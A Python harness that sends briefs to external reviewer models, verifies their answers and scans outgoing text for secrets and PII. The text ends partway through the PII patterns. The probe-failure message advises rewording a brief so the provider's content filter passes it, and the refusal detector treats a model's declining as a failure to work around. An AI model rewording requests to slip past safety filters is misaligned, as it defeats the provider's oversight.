#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
orchestrate.py — call external reviewer models in parallel, at full depth, and verify the answers.

Companion to SKILL.md in this directory. Standard library only: no pip install, works anywhere
Python 3.8+ runs. Every non-obvious line carries a comment naming the failure it prevents.

    python orchestrate.py --brief BRIEF.md --system SYSTEM.md --tier deep --out ./reviews
    python orchestrate.py --brief BRIEF.md --tier strategic --only spark
    python orchestrate.py --brief BRIEF.md --tier deep --marker REVIEW-COMPLETE-T42

Environment (see SKILL.md section 1). The key is read here and never printed:
    MODEL_API_KEY   bearer token for the HTTPS reviewer
    MODEL_API_BASE  default https://api.meta.ai/v1
    MODEL_NAME      default muse-spark-1.1
    CODEX_BIN       default "codex"
    AGY_BIN         default %LOCALAPPDATA%\\agy\\bin\\agy.exe
"""

import argparse
import datetime
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
import traceback
import re
import urllib.error
import urllib.request
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# Windows consoles default to cp1251/cp866 and will crash on the first non-ASCII character
# in a model's answer. Force UTF-8 on stdout before anything can print.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# --- thinking tiers -------------------------------------------------------------------------
# Bare {"type":"adaptive"} silently under-allocates: measured 9,955 output tokens and ZERO web
# searches on a brief where {"type":"enabled","budget_tokens":100000} produced 20,132 tokens and
# 34 searches. The floor is what you assert the answer against afterwards (see verify()).
#
# 🔴 THE TIER LIST HAD TWO HOMES AND THAT WAS ABOUT TO COST A SILENT FAILURE. Until 2026-08-08
# this dict was a literal AND `channels.json` carried its own `tiers` object; `--tier`'s choices
# came from here while the per-kind effort and timeouts came from there. So Igor's «quick и
# standard давай уберем» would have deleted them from the registry and left the flag still
# ACCEPTING them - falling through to whatever defaults each branch happened to have, which is
# the shape of every decorative-knob defect this project has recorded. The registry is now the
# single home; the literal below survives only for the degraded no-registry path, where a
# reasonable run beats an exception.
_TIERS_FALLBACK = {
    "strategic": {"http_thinking_budget": 60000,  "http_floor": 15000, "http_effort": "xhigh"},
    "deep":      {"http_thinking_budget": 100000, "http_floor": 25000, "http_effort": "xhigh"},
}


def load_tiers():
    """Tier definitions from channels.json, falling back to the literal above."""
    try:
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "channels.json")
        with open(p, encoding="utf-8") as fh:
            t = json.load(fh).get("tiers")
        return t if isinstance(t, dict) and t else dict(_TIERS_FALLBACK)
    except Exception:                                     # noqa: BLE001
        return dict(_TIERS_FALLBACK)


def tier_config(tier):
    """The Spark-shaped view of a tier: the thinking block and the output-token floor.

    `budget_tokens` is sent but does NOT set depth on this endpoint - Meta documents it as
    "accepted for compatibility but not translated into an effort value", and depth is
    output_config.effort alone. It is kept because it does two real things: it decides whether
    the call streams (see STREAM_ABOVE_BUDGET), and the floor derived beside it is what
    _verify_http asserts the answer against.
    """
    t = load_tiers().get(tier) or _TIERS_FALLBACK.get(tier) or _TIERS_FALLBACK["strategic"]
    budget = int(t.get("http_thinking_budget") or 60000)
    return {"thinking": {"type": "enabled", "budget_tokens": budget},
            "floor": int(t.get("http_floor") or 0)}

MAX_TOKENS = 131072          # ceiling; must exceed budget_tokens plus the final answer
STREAM_ABOVE_BUDGET = 32000  # above this, a non-streaming call is a coin flip. See SKILL.md 2.4.
AGY_ARGV_LIMIT = 30000       # Windows command line dies somewhere past ~32K chars


# Console output is also teed to <out>/run.log and kept in memory for diagnostics.json.
# Appending per line rather than buffering is deliberate: if the run is killed or the machine
# dies mid-review, the log of what happened up to that point is what makes the failure
# diagnosable, and a buffered log is empty in exactly that case.
_LOG = {"path": None, "lines": []}


def log(msg):
    # Scrubbed at the single choke point rather than at each call site. Caught while testing the
    # crash handler: an exception whose MESSAGE contained a key printed it to the console in full,
    # because only the diagnostics FILE was being scrubbed. stdout is read by the orchestrating
    # model and archived to disk, so it is the same exfiltration surface as any other - and the
    # one call site that forgets is the one that matters. scrub() is defined further down; the
    # lookup happens at call time, so ordering is not a problem.
    msg = scrub(str(msg))
    print(msg, flush=True)
    _LOG["lines"].append(msg)
    if _LOG["path"]:
        try:
            with open(_LOG["path"], "a", encoding="utf-8") as f:
                f.write(msg + "\n")
        except OSError:
            pass          # a broken log must never take the run down with it


# =============================================================================================
# HTTPS reviewer (Anthropic Messages shape)
# =============================================================================================

def _post(url, payload, key, timeout, stream):
    """One HTTP attempt. Returns (parsed_or_raw, http_status). Raises on transport failure."""
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode("utf-8"),
        headers={
            "Authorization": "Bearer " + key,   # some hosts want x-api-key instead; try bearer first
            "Content-Type": "application/json",
            "Accept": "text/event-stream" if stream else "application/json",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        if not stream:
            return json.loads(resp.read().decode("utf-8")), resp.status
        return _read_sse(resp), resp.status


def _read_sse(resp):
    """
    Collapse an Anthropic SSE stream into the same dict shape a non-streaming call returns.

    Streaming is MANDATORY for big thinking budgets: idle connections get dropped by
    intermediaries, and a client may refuse a non-streaming request expected to run past ~10 min.
    """
    out = {"content": [], "usage": {}, "stop_reason": None, "sse_error": None}
    text_parts, blocks = [], []
    for raw in resp:
        line = raw.decode("utf-8", errors="replace").strip()
        if not line.startswith("data:"):
            continue                      # skip "event:" lines and keep-alive blanks
        body = line[5:].strip()
        if not body or body == "[DONE]":
            continue
        try:
            ev = json.loads(body)
        except json.JSONDecodeError:
            continue                      # a partial frame; the next one will carry it
        t = ev.get("type")
        if t == "error":
            # The endpoint answers HTTP 200 and THEN streams a single error frame. Without
            # this branch the frame fell through the elif chain, the stream ended with no
            # text, and the run was reported as "EMPTY ANSWER" with no cause - which cost
            # two whole review rounds on 2026-07-29 before the payload was bisected by hand.
            out["sse_error"] = (ev.get("error", {}) or {}).get("message") or json.dumps(ev)[:300]
        elif t == "message_start":
            out["usage"].update(ev.get("message", {}).get("usage", {}) or {})
        elif t == "content_block_start":
            # Keep the whole block, not just its type. A `web_search_tool_result` block carries
            # the URLs the model actually fetched, and throwing them away was why the
            # cited-vs-opened check existed for agy and not for this channel - the one place
            # fabricated citations were proved, checked on one channel out of three.
            cb = ev.get("content_block", {}) or {}
            if cb.get("type") and cb.get("type") != "text":
                blocks.append(cb)
        elif t == "content_block_delta":
            d = ev.get("delta", {})
            if d.get("type") == "text_delta":
                text_parts.append(d.get("text", ""))
        elif t == "message_delta":
            out["stop_reason"] = ev.get("delta", {}).get("stop_reason") or out["stop_reason"]
            # output_tokens only becomes final here; message_start carries a placeholder
            out["usage"].update(ev.get("usage", {}) or {})
    out["content"] = blocks
    out["content"].append({"type": "text", "text": "".join(text_parts)})
    return out


def call_http_reviewer(brief, system, tier, marker, timeout=2400, model=None, name="spark",
                       effort=None):
    """Probe, then the real call, with retries that distinguish network blips from refusals.

    `model` comes from the routing plan, i.e. from channels.json. 🔴 Until 2026-08-06 it did not
    exist and the model was read straight out of MODEL_NAME with a hard-coded fallback, so
    `channels.spark.model` was decorative - the SAME defect codex carried until 2026-08-02, in
    the same file, discovered four days later because the earlier fix was applied to the one
    instance rather than to the class. MODEL_NAME still works, because a documented escape hatch
    that stops working is its own kind of trap, but it can no longer win in silence.

    `name` exists because two channels now share this function (spark 1.1 and spark 1.2 run in
    parallel) and a log line reading `[http]` twice describes neither of them.
    """
    key = os.environ.get("MODEL_API_KEY")
    if not key and os.name == "nt":
        try:                                  # PowerShell setx writes here; the process env may lag
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
                key = winreg.QueryValueEx(reg, "MODEL_API_KEY")[0]
        except OSError:
            pass
    if not key:
        return {"channel": "http", "ok": False, "error": "MODEL_API_KEY not set"}

    url = os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1").rstrip("/") + "/messages"
    # 🔴 The REGISTRY wins over MODEL_NAME whenever the registry named a model, and this is not
    # the usual "explicit env beats config" convention - it is the opposite, on purpose. Two
    # channels now share this endpoint, so one process-wide environment variable would force
    # BOTH onto the same model while the resolved plan went on printing two different ones: the
    # panel silently collapses to a single voice and the printout says otherwise. An override
    # that can only be applied to every channel at once is not an override, it is a footgun.
    # MODEL_NAME still governs when there is no registry (the degraded, no-routing path).
    env_model = os.environ.get("MODEL_NAME")
    if model and env_model and env_model != model:
        log("  [%s] NOTE: MODEL_NAME=%s is set in the environment; the registry names %s for "
            "this channel and the REGISTRY WINS (a single env var cannot address one of several "
            "channels on this endpoint). Use --set %s=<model> to change it."
            % (name, env_model, model, name))
    model = model or env_model or "muse-spark-1.1"
    log("  [%s] model=%s" % (name, model))
    cfg = tier_config(tier)
    base = {"model": model, "system": system, "messages": [{"role": "user", "content": brief}]}

    # --- probe: real system + real message, tiny max_tokens, no thinking, no tools.
    # Content filters are CUMULATIVE over a long payload, so a packet that passes in pieces can
    # fail whole. Better to learn that for 64 tokens than for 100,000.
    probe = dict(base, max_tokens=64)
    t0 = time.time()
    try:
        _post(url, probe, key, 240, stream=False)
        log("  [%s] probe OK in %.0fs" % (name, time.time() - t0))
    except urllib.error.HTTPError as e:
        msg = e.read().decode("utf-8", errors="replace")[:400]
        if "content management policy" in msg or e.code == 403:
            return {"channel": "http", "ok": False,
                    "error": "CONTENT FILTER on probe - neutralise wording in the SENT copy "
                             "only, strip appendices, re-probe. Do NOT retry unchanged. " + msg}
        return {"channel": "http", "ok": False, "error": "probe HTTP %d: %s" % (e.code, msg)}
    except Exception as e:
        return {"channel": "http", "ok": False, "error": "probe transport failure: %r" % (e,)}

    # --- the real call
    budget = cfg["thinking"].get("budget_tokens", 0)
    stream = budget > STREAM_ABOVE_BUDGET
    # output_config is sent OPTIMISTICALLY and dropped on the first api_error.
    #
    # Measured 2026-07-29 by bisecting the payload one field at a time: this endpoint now
    # answers `thinking.enabled + tools + output_config` with HTTP 200 followed by an SSE
    # frame {"error":{"message":"Internal server error.","type":"api_error"}}, in 0.5s. The
    # identical payload WITHOUT output_config returned 17 902 chars and ~50 web-search
    # blocks in 152s. Since it is a 200 and not a 400, none of the HTTPError branches below
    # can see it - hence the explicit sse_error retry.
    #
    # 🔴 `effort` NOW COMES FROM THE TIER, and until 2026-08-06 it was the literal "xhigh" for
    # every tier - which made the tier ladder decorative on this channel. Meta's own docs:
    # `thinking: {type:"enabled", budget_tokens:n}` is "accepted for compatibility but not
    # translated into an effort value", so the budget the tier varies is inert and the one field
    # that sets depth was pinned. `max` is NOT a legal value here despite appearing in the
    # vendor's OpenAPI enum - probed on both Spark models, 400 on both, and an invented value
    # gives the same 400, which is the control that proves the field is validated at all.
    effort = effort or "xhigh"
    payload = dict(base,
                   max_tokens=MAX_TOKENS,
                   thinking=cfg["thinking"],
                   output_config={"effort": effort},
                   tools=[{"type": "web_search_20250305", "name": "web_search"}])
    if stream:
        payload["stream"] = True
    log("  [%s] tier=%s effort=%s budget=%s stream=%s"
        % (name, tier, effort, budget or "adaptive", stream))

    t0 = time.time()
    last = None
    for attempt in range(4):
        try:
            data, _ = _post(url, payload, key, timeout, stream)
            sse_err = data.get("sse_error") if isinstance(data, dict) else None
            if sse_err and "output_config" in payload:
                log("  [%s] 200+SSE error (%s) - dropping output_config and retrying"
                    % (name, sse_err[:80]))
                payload.pop("output_config")
                last = "sse_error: %s" % sse_err
                continue
            if sse_err:
                return {"channel": "http", "ok": False,
                        "error": "endpoint streamed an error frame: %s" % sse_err}
            res = _verify_http(data, marker, cfg["floor"], time.time() - t0, tier)
            # What was actually sent, carried back so the status line and diagnostics report the
            # run rather than the config. `output_config` is dropped on an SSE api_error retry,
            # so "the effort we asked for" and "the effort that survived" are not the same fact.
            res["effort"] = payload.get("output_config", {}).get("effort")
            res["model"] = model
            return res
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")[:400]
            last = "HTTP %d: %s" % (e.code, body)
            if e.code == 400 and "thinking" in body:
                # Provider divergence: some hosts reject enabled+budget, others reject adaptive.
                # Flip the form once and try again rather than failing the whole round.
                payload["thinking"] = ({"type": "adaptive", "display": "summarized"}
                                       if cfg["thinking"]["type"] == "enabled"
                                       else {"type": "enabled", "budget_tokens": 60000})
                log("  [%s] 400 on thinking shape - flipping form and retrying" % name)
                continue
            if e.code == 401 or "content management policy" in body:
                break                                  # never retry auth or filter unchanged
            if e.code == 429 or e.code >= 500:
                time.sleep(2 ** attempt)
                continue
            break
        except Exception as e:
            # gaierror / getaddrinfo failed / connection reset. A real run died here once and
            # took the whole orchestration with it, because urllib has no retry of its own.
            last = "transport: %r" % (e,)
            log("  [%s] %s - retry %d/3 in %ds" % (name, last, attempt + 1, 2 ** attempt))
            time.sleep(2 ** attempt)
    return {"channel": "http", "ok": False, "error": last}


def _verify_http(data, marker, floor, secs, tier):
    """The four mandatory checks from SKILL.md 2.7. A call that ran is not a review that happened."""
    blocks = data.get("content", []) or []
    text = "\n\n".join(b.get("text", "") for b in blocks if b.get("type") == "text")
    usage = data.get("usage", {}) or {}
    out_tok = usage.get("output_tokens") or 0

    # tools: is PERMISSION, not instruction. A model handed web_search may never call it and then
    # answer dated questions from training data.
    searches = (usage.get("server_tool_use") or {}).get("web_search_requests")
    if searches is None:
        searches = sum(1 for b in blocks
                       if b.get("type") in ("server_tool_use", "web_search_tool_result"))

    # HARD failures: the answer is unusable. Never report one of these as a review.
    #
    # `note` is created HERE, above its first reader. It used to be initialised after the
    # record_refusal() call below, so _verify_http raised UnboundLocalError on every Spark
    # answer. The generic `except Exception` in the retry loop then relabelled a pure Python bug
    # as "transport: ...", slept through four attempts and reported the channel as a network
    # failure - on the channel the cost ladder makes the default for every lookup. Measured
    # 2026-08-07: spark11 returned nothing at all, three times, with a message pointing at DNS.
    fail = []
    note = []
    if data.get("stop_reason") not in (None, "end_turn"):
        fail.append("stop_reason=%s (TRUNCATED - the tail of the analysis is missing)"
                    % data.get("stop_reason"))
    if marker and marker not in text:
        fail.append("END MARKER ABSENT - output is incomplete, do not parse it as a finished review")
    if not text.strip():
        fail.append("EMPTY ANSWER despite a successful HTTP call")
    record_refusal(refusal_check(text, marker), fail, note)

    # SOFT signals: the answer exists and may be fine; judge it yourself.
    # Kept out of `ok` because a false alarm here trains you to ignore the real ones.
    if not searches:
        note.append("ZERO tool invocations - every dated fact in this answer is from training data, "
                    "not from the web. Treat dated claims as unverified.")
    # Same cited-vs-opened check the agy channel gets. This channel reports a search COUNT, which
    # proves activity and not grounding - the distinction that caught four fabricated Federal
    # Register document numbers on the other channel. `web_search_tool_result` blocks list the
    # pages actually fetched, so the comparison is free once the blocks are kept.
    opened = set()
    for b in blocks:
        if b.get("type") == "web_search_tool_result":
            for item in (b.get("content") or []):
                if isinstance(item, dict) and item.get("url"):
                    opened.add(_norm_url(item["url"]))
    n_cited, grounded, ungrounded = _cite_check(text, opened)
    # Only speak when there IS a record of what was opened. With an empty `opened` set every
    # citation looks ungrounded, which would be inferring a failure from missing evidence - the
    # exact move this harness forbids the models themselves to make.
    if opened and ungrounded:
        msg = ("CITATIONS: only %d of %d cited URLs appear among the %d pages this run actually "
               "fetched. Unopened: %s. Those came from the model's memory, not from a page it "
               "read - verify before repeating them."
               % (len(grounded), n_cited, len(opened), ", ".join(ungrounded[:5])))
        # Zero grounding with citations present is memory dressed as research: a hard failure.
        # Partial grounding stays a note, because such a review can still be worth reading.
        (fail if n_cited and not grounded else note).append(msg)

    if floor and out_tok and out_tok < floor:
        # Caught by running it: a brief that says "answer in under 250 words" makes a short reply
        # CORRECT, and this check then fires on a perfectly good answer. The floor only means
        # something when the brief did not cap the length.
        note.append("output_tokens=%d is below the %d floor for tier '%s'. If the brief asked for a "
                    "short answer this is expected and fine. If it asked for a full review, the "
                    "model under-allocated: raise budget_tokens or split into more sub-questions."
                    % (out_tok, floor, tier))

    # 🔴 ON THIS ENDPOINT CACHED INPUT IS DISJOINT FROM `input_tokens`; ON THE OTHER ONE IT IS A
    # SUBSET. Measured 2026-08-07 against the live Messages API with the real 59,408-char round-26
    # brief: an identical repeat call returned `input_tokens: 8` alongside
    # `cache_read_input_tokens: 13937`. Were cached tokens a subset, `input_tokens` would have read
    # ~13,945. So here the true prompt size is the SUM - while OpenAI's convention (which the codex
    # channel parses) is that `cached_input_tokens` is contained IN `input_tokens`. The same field
    # name means two opposite things two channels apart, so the arithmetic is done here, per
    # vendor, instead of being left to whoever reads the report.
    #
    # The reason this is a defect and not bookkeeping: `in_tokens` alone reported 8 for a 58 KB
    # brief. Every "how big was the payload" figure printed for a Spark channel after a cache hit
    # has been the UNCACHED REMAINDER wearing the name of the total - and the harness's own
    # probe-then-real-call design guarantees the real call is a hit. On a warm prefix the number
    # was not slightly wrong, it was wrong by three orders of magnitude.
    #
    # What was NOT wired, deliberately: `cache_control: {"type":"ephemeral"}` breakpoints. They
    # are ACCEPTED and VALIDATED here (an invalid type is a 400, which is the control proving the
    # field is real) and they change nothing - caching on this endpoint is automatic, and
    # `cache_creation_input_tokens` stayed 0 in every arm. Adding them would have been a knob
    # wired to nothing that looks exactly like a saving.
    cached_in = usage.get("cache_read_input_tokens") or 0
    raw_in = usage.get("input_tokens") or 0
    return {"channel": "http", "ok": not fail, "text": text, "seconds": round(secs, 1),
            "in_tokens": raw_in, "out_tokens": out_tok,
            "cached_in_tokens": cached_in,
            "in_tokens_total": raw_in + cached_in,
            "cache_convention": "disjoint (total = input_tokens + cache_read_input_tokens); "
                                "MEASURED 2026-08-07 on api.meta.ai/v1/messages",
            "tool_calls": searches, "stop_reason": data.get("stop_reason"),
            "block_types": sorted({b.get("type") for b in blocks if b.get("type")}),
            "warnings": fail, "notes": note}


# =============================================================================================
# CLI channels
# =============================================================================================

# A model that declines the task still follows the formatting instruction, so it appends the end
# marker and sails through every mechanical check. Measured 2026-07-31: Codex returned 162 bytes
# - "I can't provide the requested review because I'm not allowed to give legal advice or analyze
# an individual immigration filing strategy." - followed by a clean "AOS-REVIEW-COMPLETE", and
# the harness reported the channel OK. A marker proves the model reached the end of ITS turn, not
# that it did the work.
REFUSAL_TELLS = [
    "i can't provide", "i cannot provide", "i can’t provide",
    "i can't help", "i cannot help", "i can’t help",
    "i'm not allowed", "i am not allowed", "i’m not allowed",
    "i'm unable to", "i am unable to", "i’m unable to",
    "i won't be able", "i will not be able",
    "not able to assist", "can't assist with", "cannot assist with",
    "i must decline", "i have to decline",
]


# A returned message starting with this is a SOFT signal - the answer exists and may be perfectly
# good; judge it yourself. Anything else is HARD: the answer is unusable.
SOFT = "~soft~ "


def is_soft(msg):
    return bool(msg) and msg.startswith(SOFT)


def record_refusal(msg, hard, soft):
    """Route a refusal_check result to the list matching its severity, sentinel stripped.

    One helper rather than five copies of the same two-line branch: this check is applied by
    every channel, and 'the same test graded differently per channel' is precisely the shape that
    left the reporting layer keyed on stale literal names for four days.
    """
    if not msg:
        return
    if is_soft(msg):
        soft.append(msg[len(SOFT):])
    else:
        hard.append(msg)


def refusal_check(text, marker=None, min_chars=800):
    """
    Return a warning string if this looks like a decline rather than a review, else None.
    Prefixed with SOFT when the answer is merely short; see `is_soft`.

    Two independent signals, deliberately both required for the phrase branch: a refusal tell
    AND a short body. A long review may legitimately contain "I cannot provide a date for X"
    somewhere in the middle; a 200-character answer that opens with one is a refusal.

    🔴 BARE SHORTNESS IS NOT A REFUSAL, and grading it as one was a false alarm in the harness's
    own taxonomy - SKILL.md §3 splits HARD failures ("the answer is unusable") from SOFT signals
    ("the answer exists, judge it yourself"), and "this is shorter than 800 characters" is plainly
    the second. Found by running it 2026-08-07: a probe that said "answer in under 200 words" got
    a correct, fully-cited, verbatim-quoted answer and was reported `0/1 channels returned a
    verified review`; then --ask, whose whole purpose is a one-line lookup, failed the same way on
    a correct statutory citation. A check that cries wolf on a good answer trains you to ignore
    the alarm that matters - which is a sentence already in this project's own documentation, and
    this function was the counter-example to it.
    """
    body = (text or "").strip()
    if marker and body.endswith(marker):
        body = body[:-len(marker)].strip()
    if not body:
        return None                      # emptiness is caught by the per-channel checks
    head = body[:400].lower()
    if len(body) < min_chars and any(t in head for t in REFUSAL_TELLS):
        return ("REFUSAL, NOT A REVIEW: the channel declined the task and then appended the end "
                "marker, which passes every mechanical check. Verbatim: %r. Do not count this "
                "channel; re-scope the brief for it or drop it from this round."
                % body[:200])
    if len(body) < min_chars:
        return (SOFT + "SHORT ANSWER (%d chars excluding the marker). If the brief asked a "
                "narrow question this is correct; if it asked for a full review, read it before "
                "counting it - a decline, a truncation and a misread brief all look like this."
                % len(body))
    return None


def _run(cmd, stdin_text=None, timeout=3000, cwd=None, stdout_path=None, env=None):
    """
    stdout_path streams stdout straight to a file instead of buffering it. agy's stream-json log
    is tens of thousands of lines; more importantly, a run that is killed or times out still
    leaves a partial log on disk, which is the difference between "we know it searched 22 times
    before dying" and "no evidence at all".

    🔴 That reasoning was written for agy and applied only to agy. On 2026-08-05 codex was killed
    at the 3000-second default having produced its whole analysis, and left ZERO bytes, because it
    was given `-o outfile` (written at the end) and no stdout_path. The only surviving evidence was
    codex's own rollout in ~/.codex/sessions, which this harness never looked at. Both are fixed.
    """
    t0 = time.time()
    if stdout_path:
        with open(stdout_path, "w", encoding="utf-8") as out:
            p = subprocess.run(cmd, input=stdin_text, stdout=out, stderr=subprocess.PIPE,
                               text=True, encoding="utf-8", errors="replace",
                               timeout=timeout, cwd=cwd, env=env)
    else:
        p = subprocess.run(cmd, input=stdin_text, capture_output=True, text=True,
                           encoding="utf-8", errors="replace", timeout=timeout, cwd=cwd, env=env)
    return p, time.time() - t0


def sandbox_shell_dir():
    """A directory holding a `pwsh.exe` that the Codex Windows sandbox can actually SPAWN.

    🔴🔴 MEASURED 2026-08-05. Codex's shell tool was dead on this machine and the harness could
    not see it. Every shell command the model issued came back as::

        windows sandbox: runner failed during SpawnChild:
        CreateProcessAsUserW failed: 5 (access denied)
        cmd="C:\\Program Files\\WindowsApps\\Microsoft.PowerShell_..._x64__8wekyb3d8bbwe\\pwsh.exe"

    The cause is not the sandbox: `cmd.exe` and a non-Store `powershell.exe` both spawn fine under
    it. It is that PowerShell 7 was installed from the **Microsoft Store**, and a WindowsApps
    package is ACL-locked to its own package identity, so a lowered/impersonated token gets
    ACCESS_DENIED. `winget install Microsoft.PowerShell` does NOT help - its default installer for
    that id is the msix, i.e. the same package.

    Reproduced three ways under `codex sandbox`: Store pwsh -> error 5; `powershell.exe` 5.1 -> ok;
    a plain-ZIP PowerShell 7 in a user folder -> ok. So the fix is any pwsh outside WindowsApps,
    and it is applied to the codex CHILD PROCESS ONLY, by prepending this directory to its PATH.
    Nothing machine-wide changes: `pwsh` keeps resolving to the Store build for every other
    program, which is the whole point - the Store copy may be what the system itself uses.

    No username is written into any config: the env var wins, then the standard MSI location, then
    `~/pwsh7`. A hard-coded absolute path here would ship someone's home directory to the public
    kit that `package.py` generates from this file.
    """
    if os.name != "nt":
        return None
    cand = []
    env_dir = os.environ.get("CODEX_SHELL_DIR")
    if env_dir:
        cand.append(env_dir)
    cand += [r"C:\Program Files\PowerShell\7", os.path.expanduser(r"~\pwsh7")]
    for d in cand:
        try:
            if d and os.path.isfile(os.path.join(d, "pwsh.exe")) and "windowsapps" not in d.lower():
                return d
        except OSError:
            continue
    return None


def _codex_env():
    """The codex child's environment, with a spawnable pwsh put ahead of the Store one."""
    d = sandbox_shell_dir()
    if not d:
        return None
    env = dict(os.environ)
    env["PATH"] = d + os.pathsep + env.get("PATH", "")
    return env


def _seconds(v, fallback):
    """`"25m"` / `"90s"` / `1500` / `None` -> seconds. Config is written the way agy's flag is."""
    if v is None or v == "":
        return fallback
    try:
        if isinstance(v, (int, float)):
            return int(v)
        s = str(v).strip().lower()
        if s.endswith("m"):
            return int(float(s[:-1]) * 60)
        if s.endswith("h"):
            return int(float(s[:-1]) * 3600)
        if s.endswith("s"):
            return int(float(s[:-1]))
        return int(float(s))
    except (TypeError, ValueError):
        return fallback


# Firecrawl tools Codex must not be able to call. Costs verified on docs.firecrawl.dev
# 2026-07-26. Kept available: firecrawl_scrape (1 credit) and firecrawl_map (1 credit flat,
# any number of URLs), plus the read-only status/list tools.
#   search family  - free equivalents exist (built-in search, tavily, exa, jina)
#   crawl / agent  - unbounded: crawl bills 1 credit PER PAGE, agent caps at 2500 per job
#   monitor_*      - recurring and autonomous; the docs' own example is 2880 credits/month
#                    for a single URL on a 30-minute cron, spent with nobody watching
#   extract/parse  - token-metered or undocumented cost
#   interact       - 2 credits per browser-MINUTE; playwright and cloakbrowser are free
FIRECRAWL_DENY = [
    "firecrawl_search",
    "firecrawl_research_search_papers", "firecrawl_research_search_github",
    "firecrawl_research_related_papers", "firecrawl_research_read_paper",
    "firecrawl_research_inspect_paper",
    "firecrawl_crawl", "firecrawl_agent", "firecrawl_extract", "firecrawl_parse",
    "firecrawl_monitor_create", "firecrawl_monitor_update", "firecrawl_monitor_run",
    "firecrawl_interact", "firecrawl_interact_stop",
]


SKILL_DIR = os.path.dirname(os.path.abspath(__file__))


# =============================================================================================
# Pre-send safety net: secrets and PII
# =============================================================================================
#
# Every document in this project says "tokenize PII in the sent copy, for every channel, before
# the first call", and references/briefs.md admits in as many words: "The harness does NOT do
# this - it is on you." That is exactly the arrangement this session disproved in another area:
# prose failed 5/5 at restricting agy's tool access, and only a permission rule worked. A rule
# that depends on someone remembering it under time pressure is not a control.
#
# The asymmetry here is worse than with tools. A denied tool costs a re-run. A sent payload
# cannot be recalled - it is at three separate vendors, possibly logged, possibly retained, and
# the material in this workspace is immigration-case material.
#
# Two classes, and they are NOT the same:
#   SECRET  - a key, token or private key. Never overridable. There is no review that needs one.
#   PII     - identifiers about a person. Blocked by default, overridable with --allow-pii,
#             because reviewing e.g. a public contact page legitimately contains an address.
#
# Findings are reported as KIND + LINE NUMBER + length only. Printing the match would defeat the
# purpose: this console output is read by the orchestrating model and lands in its transcript,
# which is the very place the identifier must not reach. A line number is enough to fix it.

SECRET_PATTERNS = [
    ("PRIVATE_KEY_BLOCK", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("ANTHROPIC_KEY",     re.compile(r"\bsk-ant-[A-Za-z0-9_\-]{20,}")),
    ("OPENAI_KEY",        re.compile(r"\bsk-[A-Za-z0-9]{32,}")),
    ("AWS_ACCESS_KEY",    re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("GITHUB_TOKEN",      re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}|"
                                     r"\bgithub_pat_[A-Za-z0-9_]{30,}")),
    ("SLACK_TOKEN",       re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}")),
    ("GOOGLE_API_KEY",    re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    # Labelled assignment: catches .env lines and `Authorization: <token>` pasted into a brief.
    # `(?<![A-Za-z])` and not `\b`, because underscore counts as a word character: `\bapi_key`
    # never matches inside FIRECRAWL_API_KEY, which is the exact shape a real .env line has.
    ("LABELLED_SECRET",   re.compile(r"(?i)(?<![A-Za-z])(?:api[_-]?key|secret|token|password|"
                                     r"passwd|client[_-]?secret|authorization)(?![A-Za-z])"
                                     r"\s*[:=]\s*['\"]?[^\s'\"]{12,}")),
    # `bearer` needs its own rule and used to be an alternative in the branch above, where it
    # could never fire: that branch demands a ':' or '=' AFTER the label, and a real header is
    # `Authorization: Bearer <token>` - the delimiter precedes the word. So the one shape the
    # alternative was added for was the one shape it could not match. Found 2026-07-31 by the
    # PostToolUse hook's self-test; the third pattern in this file to read correct and match
    # nothing, which is why both gates now ship with tests instead of confidence.
    #
    # The digit lookahead is a deliberate trade: without it, `Bearer authentication` (14 chars of
    # ordinary prose) trips the no-override class. Requiring one digit inside a 20+ char token
    # costs the all-alphabetic token, which is rare, and buys silence on English.
    ("BEARER_TOKEN",      re.compile(r"(?i)\bbearer\s+(?=[A-Za-z0-9._\-]*\d)"
                                     r"[A-Za-z0-9._\-]{20,}")),
]

PII_PATTERNS = [
    # USCIS alien registration number. Word-bounded so it cannot match inside a hash.
    ("A_NUMBER",       re.compile(r"\bA-?\d{8,9}\b")),
    # USCIS receipt number: a fixed service-centre prefix plus 10 digits.
    ("USCIS_RECEIPT",  re.compile(r"\b(?:EAC|WAC|LIN|SRC|NBC|MSC|IOE|YSC|NSC|TSC|VSC|CSC)"
                                  r"\d{10}\b")),
    ("SSN",            re.compile(r"\b\d{3}-\d{2}-\d{4}\b")),
    ("EMAIL",          re.compile(r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b")),
    # No leading \b on the parenthesised form: between a space and "(" there is no word
    # boundary, so "\b\(" never matches and "phone (415) 555-0142" sailed straight through the
    # first version of this gate. Caught by testing it on a payload built to be caught.
    ("US_PHONE",       re.compile(r"(?<!\d)(?:\+1[ .\-]?)?\(\d{3}\)[ .\-]?\d{3}[ .\-]?\d{4}\b"
                                  r"|\b\d{3}-\d{3}-\d{4}\b")),
    # Label-driven, because a bare date is far too common to flag. But the label alone is not
    # enough either: `\s*[:\-]?\s*\S` accepts ANY next character, so the sentence "blocks a
    # labelled date of birth unless you pass --allow-pii" matched on the word "unless". Found by
    # running the publish audit over this project's own prose, which is full of such sentences.
    # A false positive here is not cosmetic - it is the failure mode that kills the gate, because
    # a user who sees it fire on clean text learns to pass --allow-pii by reflex, and that flag
    # disables the whole PII class at once. So the value must actually look like a date.
    #
    # NOTE the missing trailing \b after the label. This set has now hit the same trap four times:
    # `d\.?o\.?b\.?\b` can never match in "d.o.b. April 12, 1988", because between the final "."
    # and the space there is no word boundary - both are non-word characters. Ditto "passport no."
    # The date/identifier shape below is the real gate, so the closing \b was only ever a liability.
